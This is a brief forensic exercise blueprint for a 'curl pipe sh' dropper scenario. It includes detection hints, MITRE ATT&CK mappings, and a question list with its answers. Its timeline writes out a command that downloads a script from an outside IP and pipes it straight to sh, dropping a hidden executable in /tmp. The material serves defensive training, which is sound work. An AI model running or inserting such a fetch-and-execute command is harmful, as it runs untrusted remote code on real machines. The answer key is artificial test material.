# curl-pipe-sh-dropper

## Scenario
A one liner downloads and runs an attacker script (curl pipe sh), dropping a payload into /tmp.

## Timeline
```
~10:45  curl http://45.137.22.90/i.sh | sh drops and runs /tmp/.x
```

## How to spot it
- curl or wget piped straight to sh/bash
- Download from an attacker IP
- A hidden executable dropped in /tmp
- Run immediately after

## Questions
```
1. Technique?          curl | sh dropper
2. Source?             45.137.22.90/i.sh
3. Dropped?            /tmp/.x
4. User?               www-data
5. Host?               websrv01
```

## MITRE ATT&CK
- T1059.004 Unix Shell
- T1105 Ingress Tool Transfer

## Tools
Hand written Linux logs with a workday of normal activity as background

## Signature
Forensic Sample Blueprint | qayssarayra.com
